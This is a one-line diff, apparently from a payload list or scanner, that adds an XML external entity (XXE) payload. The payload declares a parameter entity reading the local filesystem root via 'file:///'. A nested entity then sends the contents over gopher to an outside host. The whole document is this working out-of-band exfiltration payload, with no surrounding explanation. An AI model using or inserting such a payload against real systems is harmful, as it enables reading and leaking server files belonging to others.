@@ -1,0 +1,1 @@
+<!ENTITY % a SYSTEM "file:///"> <!ENTITY % b "<!ENTITY &#37; c SYSTEM 'gopher://nanshihui.github.io:80/%a;'>"> %b; %c;
